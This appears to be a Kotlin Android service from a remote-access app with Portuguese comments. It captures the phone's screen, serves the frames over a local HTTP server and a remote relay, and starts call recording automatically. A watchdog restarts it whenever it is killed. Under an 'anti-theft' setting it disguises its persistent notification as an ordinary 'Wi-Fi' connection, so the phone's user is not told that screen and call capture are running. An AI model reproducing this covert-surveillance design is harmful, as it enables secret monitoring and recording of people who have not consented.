package com.fusaotech.studio

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream

/**
 * FusãoTechX Mz • Serviço principal.
 * Mantém o servidor ligado, captura o ecrã (MediaProjection) e produz as
 * imagens que o PC vê. É um serviço em primeiro plano para não ser morto.
 */
class CaptureService : Service() {

    companion object {
        @Volatile var frame: ByteArray? = null
        @Volatile var realW = 0
        @Volatile var realH = 0
        @Volatile var ativo = false
        @Volatile var qualidade = 55
        @Volatile var maxLado = 820.0
        const val CH = "ftx_run"
        const val NID = 7788
    }

    private var httpd: Httpd? = null
    private var projection: MediaProjection? = null
    private var vdisplay: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var ht: HandlerThread? = null
    private var handler: Handler? = null
    private var ultima = 0L

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        ativo = true
        if (httpd == null) {
            httpd = Httpd(this, Prefs.PORT)
            try { httpd?.start() } catch (_: Exception) {}
        }
        // Ligação remota pelo relay (telefone nos dados móveis, PC noutra rede).
        if (Prefs.relayOn(this)) Relay.iniciar(this)
        CallRecorder.iniciar(this)
        ht = HandlerThread("ftx-cap").also { it.start() }
        handler = Handler(ht!!.looper)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Desligar tudo (o dono desligou a ligação permanente).
        if (intent?.action == "stop") {
            Prefs.setRelayOn(this, false)
            Watchdog.cancelar(this); Relay.parar()
            pararCaptura(); stopForeground(true); stopSelf()
            return START_NOT_STICKY
        }
        // Parar só o ecrã, mantendo a ligação remota viva.
        if (intent?.action == "parar_ecra") {
            pararCaptura(); arrancarPrimeiroPlano(false)
            return START_STICKY
        }
        if (Prefs.relayOn(this) && !Relay.correr) Relay.iniciar(this)
        val code = intent?.getIntExtra("code", 0) ?: 0
        val data = if (Build.VERSION.SDK_INT >= 33)
            intent?.getParcelableExtra("data", Intent::class.java)
        else @Suppress("DEPRECATION") intent?.getParcelableExtra("data")
        val temProj = code != 0 && data != null
        arrancarPrimeiroPlano(temProj)
        if (temProj) handler?.postDelayed({ iniciarCaptura(code, data!!) }, 400)
        // Garante que o cão de guarda está agendado sempre que o serviço corre.
        if (Prefs.relayOn(this) || Prefs.autostart(this)) Watchdog.agendar(this)
        return START_STICKY
    }

    /** Se o telefone matar o serviço (bateria), volta a ligar-se sozinho. */
    override fun onTaskRemoved(rootIntent: Intent?) {
        if (Prefs.relayOn(this) || Prefs.autostart(this)) { Watchdog.garantirServico(applicationContext); Watchdog.agendar(applicationContext) }
        super.onTaskRemoved(rootIntent)
    }

    private fun arrancarPrimeiroPlano(comProjecao: Boolean) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(CH, "Serviço", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false); nm.createNotificationChannel(ch)
        }
        // Texto discreto quando está disfarçado (anti-roubo); normal caso contrário.
        val disfarcado = Prefs.disfarce(this) != "normal"
        val n: Notification = Notification.Builder(this, CH)
            .setContentTitle(if (disfarcado) "Wi-Fi" else "FusãoTechX ligado")
            .setContentText(if (disfarcado) "Ligado" else ("Ligação ativa" + (if (Prefs.relayOn(this)) " · ID ${Prefs.relayId(this)}" else "")))
            .setSmallIcon(R.drawable.ic_launcher)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 29) startForeground(NID, n, tipoFgs(comProjecao))
            else startForeground(NID, n)
        } catch (_: Exception) {
            try { startForeground(NID, n) } catch (_: Exception) {}
        }
    }

    /** Tipo de serviço em primeiro plano adequado a esta versão do Android. */
    private fun tipoFgs(comProjecao: Boolean): Int {
        val I = android.content.pm.ServiceInfo::class.java
        var t = 0
        try {
            if (Build.VERSION.SDK_INT >= 34) t = t or I.getField("FOREGROUND_SERVICE_TYPE_SPECIAL_USE").getInt(null)
            if (Build.VERSION.SDK_INT >= 30) {
                t = t or I.getField("FOREGROUND_SERVICE_TYPE_CAMERA").getInt(null)
                t = t or I.getField("FOREGROUND_SERVICE_TYPE_LOCATION").getInt(null)
            }
            if (t == 0 && Build.VERSION.SDK_INT >= 29) t = I.getField("FOREGROUND_SERVICE_TYPE_DATA_SYNC").getInt(null)
            if (comProjecao) t = t or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        } catch (_: Exception) { t = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION }
        return t
    }

    private fun iniciarCaptura(code: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            projection = mpm.getMediaProjection(code, data)
            projection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { pararCaptura() }
            }, handler)

            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= 30) {
                val b = wm.currentWindowMetrics.bounds
                realW = b.width(); realH = b.height()
                dm.densityDpi = resources.configuration.densityDpi
            } else {
                @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm)
                realW = dm.widthPixels; realH = dm.heightPixels
            }
            // Resolução de captura reduzida para fluidez
            val esc = minOf(1.0, maxLado / maxOf(realW, realH))
            val capW = (realW * esc).toInt().coerceAtLeast(2) and 1.inv()
            val capH = (realH * esc).toInt().coerceAtLeast(2) and 1.inv()

            reader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 2)
            reader!!.setOnImageAvailableListener({ r ->
                val img = try { r.acquireLatestImage() } catch (_: Exception) { null } ?: return@setOnImageAvailableListener
                try {
                    val agora = System.currentTimeMillis()
                    if (agora - ultima < 28) return@setOnImageAvailableListener
                    ultima = agora
                    val plane = img.planes[0]
                    val buf = plane.buffer
                    val pixelStride = plane.pixelStride
                    val rowStride = plane.rowStride
                    val rowPad = rowStride - pixelStride * capW
                    val bmpW = capW + rowPad / pixelStride
                    val bmp = Bitmap.createBitmap(bmpW, capH, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buf)
                    val recorte = if (bmpW != capW) Bitmap.createBitmap(bmp, 0, 0, capW, capH) else bmp
                    val bos = ByteArrayOutputStream(60000)
                    recorte.compress(Bitmap.CompressFormat.JPEG, qualidade, bos)
                    frame = bos.toByteArray()
                    if (recorte !== bmp) recorte.recycle()
                    bmp.recycle()
                } catch (_: Exception) {} finally { try { img.close() } catch (_: Exception) {} }
            }, handler)

            vdisplay = projection!!.createVirtualDisplay(
                "ftx", capW, capH, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader!!.surface, null, handler
            )
        } catch (_: Exception) {}
    }

    private fun pararCaptura() {
        try { vdisplay?.release() } catch (_: Exception) {}
        try { reader?.close() } catch (_: Exception) {}
        try { projection?.stop() } catch (_: Exception) {}
        vdisplay = null; reader = null; projection = null; frame = null
    }

    override fun onDestroy() {
        ativo = false
        Relay.parar()
        pararCaptura()
        try { httpd?.parar() } catch (_: Exception) {}
        try { ht?.quitSafely() } catch (_: Exception) {}
        super.onDestroy()
    }
}
